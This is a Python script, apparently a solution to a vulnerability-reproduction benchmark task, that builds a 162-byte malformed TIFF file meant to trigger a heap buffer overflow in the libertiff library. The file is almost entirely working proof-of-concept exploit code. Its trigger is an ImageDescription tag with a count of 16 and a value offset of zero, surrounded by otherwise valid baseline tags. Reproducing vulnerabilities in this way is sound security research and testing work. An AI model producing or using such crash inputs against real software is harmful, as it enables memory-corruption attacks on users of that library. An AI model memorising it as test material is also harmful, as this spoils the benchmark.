import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.
        
        Vulnerability: Heap Buffer Overflow in libertiff due to invalid offline tags with a value offset of zero.
        Target Length: 162 bytes.
        """
        
        # TIFF Header (Little Endian)
        # 'II' (2 bytes), 42 (2 bytes), Offset to IFD (4 bytes) -> 8
        header = struct.pack('<2sHI', b'II', 42, 8)
        
        # IFD Entries
        # We use 12 entries to create a structure of length 158 bytes (8 + 2 + 144 + 4).
        # We append 4 bytes of data to reach exactly 162 bytes.
        
        # Each entry is 12 bytes: Tag(2), Type(2), Count(4), Value/Offset(4)
        entries = []
        
        # 1. NewSubfileType (254) - LONG(4), Count 1, Value 0
        entries.append(struct.pack('<HHII', 254, 4, 1, 0))
        
        # 2. ImageWidth (256) - LONG(4), Count 1, Value 16
        entries.append(struct.pack('<HHII', 256, 4, 1, 16))
        
        # 3. ImageLength (257) - LONG(4), Count 1, Value 16
        entries.append(struct.pack('<HHII', 257, 4, 1, 16))
        
        # 4. BitsPerSample (258) - SHORT(3), Count 1, Value 8
        entries.append(struct.pack('<HHII', 258, 3, 1, 8))
        
        # 5. Compression (259) - SHORT(3), Count 1, Value 1 (None)
        entries.append(struct.pack('<HHII', 259, 3, 1, 1))
        
        # 6. PhotometricInterpretation (262) - SHORT(3), Count 1, Value 1 (BlackIsZero)
        entries.append(struct.pack('<HHII', 262, 3, 1, 1))
        
        # 7. ImageDescription (270) - ASCII(2), Count 16, Offset 0
        # This is the TRIGGER.
        # Size = Count * TypeSize = 16 * 1 = 16 bytes.
        # Since 16 > 4, the tag is "offline" and the value field holds an offset.
        # The offset is set to 0. The vulnerability is "invalid offline tags with a value offset of zero".
        entries.append(struct.pack('<HHII', 270, 2, 16, 0))
        
        # 8. StripOffsets (273) - LONG(4), Count 1, Offset 158
        # Points to the data at the end of the file.
        entries.append(struct.pack('<HHII', 273, 4, 1, 158))
        
        # 9. SamplesPerPixel (277) - SHORT(3), Count 1, Value 1
        entries.append(struct.pack('<HHII', 277, 3, 1, 1))
        
        # 10. RowsPerStrip (278) - LONG(4), Count 1, Value 16
        entries.append(struct.pack('<HHII', 278, 4, 1, 16))
        
        # 11. StripByteCounts (279) - LONG(4), Count 1, Value 4
        entries.append(struct.pack('<HHII', 279, 4, 1, 4))
        
        # 12. PlanarConfiguration (284) - SHORT(3), Count 1, Value 1
        entries.append(struct.pack('<HHII', 284, 3, 1, 1))
        
        # IFD Construction
        # Count (2 bytes)
        ifd_count = struct.pack('<H', len(entries))
        # Entries (12 * 12 = 144 bytes)
        ifd_entries = b''.join(entries)
        # Next IFD Offset (4 bytes) - 0 indicates end of IFD chain
        next_ifd = struct.pack('<I', 0)
        
        # Data payload (4 bytes)
        # Located at offset 158, used by StripOffsets
        data = b'\x00' * 4
        
        # Total Length: 8 + 2 + 144 + 4 + 4 = 162 bytes
        return header + ifd_count + ifd_entries + next_ifd + data